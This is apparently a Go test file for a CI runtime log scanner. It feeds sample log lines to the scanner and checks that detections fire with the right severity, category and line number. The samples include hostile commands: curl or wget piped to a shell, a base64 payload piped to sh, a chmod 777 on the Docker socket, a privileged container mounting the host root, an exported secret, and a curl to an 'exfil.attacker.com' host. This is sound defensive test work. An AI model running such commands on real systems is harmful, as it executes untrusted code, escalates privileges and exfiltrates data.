package analysis

import (
	"strings"
	"testing"
)

func TestRuntimeScanCurlPipe(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:    "  curl https://install.example.com/script.sh | bash",
		RunID:   "r1",
		JobName: "build",
	}
	findings := ScanRuntimeLogs(req)
	if len(findings) == 0 {
		t.Fatal("expected at least one finding for curl | bash")
	}
	found := false
	for _, f := range findings {
		if f.Pattern == "curl-pipe-shell" {
			found = true
			if f.Severity != "critical" {
				t.Errorf("expected critical, got %s", f.Severity)
			}
			if f.Category != "supply-chain" {
				t.Errorf("expected supply-chain, got %s", f.Category)
			}
			if f.LineNumber != 1 {
				t.Errorf("expected line 1, got %d", f.LineNumber)
			}
		}
	}
	if !found {
		t.Error("curl-pipe-shell pattern not triggered")
	}
}

func TestRuntimeScanWgetPipe(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:  "wget -q https://example.com/setup.sh | sh",
		RunID: "r2",
	}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "wget-pipe-shell" {
			found = true
			if f.Severity != "critical" {
				t.Errorf("expected critical, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Error("wget-pipe-shell pattern not triggered")
	}
}

func TestRuntimeScanSecretExfil(t *testing.T) {
	logs := "step 1\nexport AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\nstep 3"
	req := RuntimeScanRequest{Logs: logs, RunID: "r3"}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "secret-env-export" {
			found = true
			if f.LineNumber != 2 {
				t.Errorf("expected line 2, got %d", f.LineNumber)
			}
			if f.Severity != "high" {
				t.Errorf("expected high, got %s", f.Severity)
			}
			if f.Category != "secret-exposure" {
				t.Errorf("expected secret-exposure, got %s", f.Category)
			}
		}
	}
	if !found {
		t.Error("secret-env-export pattern not triggered")
	}
}

func TestRuntimeScanPrivilegeEsc(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:  "sudo chmod 777 /var/run/docker.sock",
		RunID: "r4",
	}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "privilege-escalation" {
			found = true
			if f.Severity != "high" {
				t.Errorf("expected high, got %s", f.Severity)
			}
			if f.Category != "container-security" {
				t.Errorf("expected container-security, got %s", f.Category)
			}
		}
	}
	if !found {
		t.Error("privilege-escalation pattern not triggered for sudo chmod 777")
	}
}

func TestRuntimeScanPrivilegedDocker(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:  "docker run --privileged -v /:/host ubuntu bash",
		RunID: "r5",
	}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "privileged-container" {
			found = true
			if f.Severity != "high" {
				t.Errorf("expected high, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Error("privileged-container pattern not triggered")
	}
}

func TestRuntimeScanBase64Decode(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:  "echo aGVsbG8= | base64 -d | sh",
		RunID: "r6",
	}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "base64-decode-pipe" {
			found = true
			if f.Severity != "high" {
				t.Errorf("expected high, got %s", f.Severity)
			}
			if f.Category != "supply-chain" {
				t.Errorf("expected supply-chain, got %s", f.Category)
			}
		}
	}
	if !found {
		t.Error("base64-decode-pipe pattern not triggered")
	}
}

func TestRuntimeScanCleanLogs(t *testing.T) {
	logs := `Initializing build environment
go build ./...
Running tests: ok
All checks passed
Build complete`
	req := RuntimeScanRequest{Logs: logs, RunID: "r7"}
	findings := ScanRuntimeLogs(req)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean logs, got %d: %+v", len(findings), findings)
	}
}

func TestRuntimeScanLineNumberAccuracy(t *testing.T) {
	logs := "step1\nstep2\ncurl http://example.com/data.sh | bash\nstep4"
	req := RuntimeScanRequest{Logs: logs, RunID: "r8"}
	findings := ScanRuntimeLogs(req)
	for _, f := range findings {
		if f.Pattern == "curl-pipe-shell" && f.LineNumber != 3 {
			t.Errorf("expected line 3, got %d", f.LineNumber)
		}
	}
}

func TestRuntimeScanLineTruncation(t *testing.T) {
	// Generate a line longer than 200 chars
	line := "export MY_SECRET_TOKEN=" + strings.Repeat("x", 230)
	req := RuntimeScanRequest{Logs: line, RunID: "r9"}
	findings := ScanRuntimeLogs(req)
	for _, f := range findings {
		if len(f.Line) > 200 {
			t.Errorf("line should be truncated to 200 chars, got %d", len(f.Line))
		}
	}
}

func TestRuntimeScanNonStandardPort(t *testing.T) {
	req := RuntimeScanRequest{
		Logs:  "curl https://exfil.attacker.com:4444/steal",
		RunID: "r10",
	}
	findings := ScanRuntimeLogs(req)
	found := false
	for _, f := range findings {
		if f.Pattern == "non-standard-port" {
			found = true
			if f.Category != "network" {
				t.Errorf("expected network, got %s", f.Category)
			}
		}
	}
	if !found {
		t.Error("non-standard-port pattern not triggered")
	}
}
